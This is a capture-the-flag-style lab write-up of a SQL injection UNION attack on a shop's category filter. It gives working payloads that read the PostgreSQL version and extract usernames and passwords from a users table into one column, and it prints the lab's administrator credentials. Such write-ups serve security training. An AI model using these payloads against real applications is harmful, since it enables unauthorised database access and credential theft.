# SQL injection UNION attack, retrieving multiple values in a single column

## Information

- Lab: SQLi
- Level: PRACTITIONER
- Description:

    ![](<Images/SQL injection UNION attack, retrieving multiple values in a single column 0.png>)

## Solution


![](<Images/SQL injection UNION attack, retrieving multiple values in a single column 1.png>)

After accessing the website, I tried selecting the `Lifestyle` category and found an untrusted data in the URL

```text
filter?category=Lifestyle
```

I intercepted that traffic in Burp and tried adding a single quote `'` to the payload

![alt text](<Images/SQL injection UNION attack, retrieving multiple values in a single column 2.png>)

As I expected, after the request was sent, the server returned an error

```text
Internal Server Error
```

After confirming that a SQLi vulnerability exists, I needed to know how many columns the current query has in order to perform a `UNION` attack

After using [ORDER BY combined with Binary Search](./Find%20the%20number%20of%20columns%20using%20ORDER%20BY%20and%20binary%20search%20principles.md), I found that the current query has 2 columns.

Next, I needed to know which SQL version was being used

```sql
Lifestyle' UNION SELECT NULL, version() -- -
```

And I got the result

```text
PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
```

Note: Because I still kept the payload `Lifestyle'`, the returned result was not very clean (image below)

![alt text](<Images/SQL injection UNION attack, retrieving multiple values in a single column 3.png>)

And as the lab description mentioned, we will exploit the `users` table and the 2 columns `username` and `password` to get the admin account

I used the payload

```sql
Lifestyle' UNION SELECT username, password FROM users -- -
```

But wait, after sending the payload above, the server returned an error again :( !

```text
Internal Server Error
```

It seems that the first column of the query is not a `STRING` data type. So I needed to concatenate `username` and `password` and display them in the second column

And because the backend is using `PostgreSQL 12.22`, I used the payload

```sql
Lifestyle' UNION SELECT NULL, username ||'-->'|| password FROM users -- -
```

And luckily, the payload worked

![](<Images/SQL injection UNION attack, retrieving multiple values in a single column 6.png>)

We got the admin account credentials

```text
username : administrator
password : snlojy7p7e06gfm7lmd6
```

After logging into the account, the lab was solved

![alt text](<Images/SQL injection UNION attack, retrieving multiple values in a single column 7.png>)

![alt text](<Images/SQL injection UNION attack, retrieving multiple values in a single column 8.png>)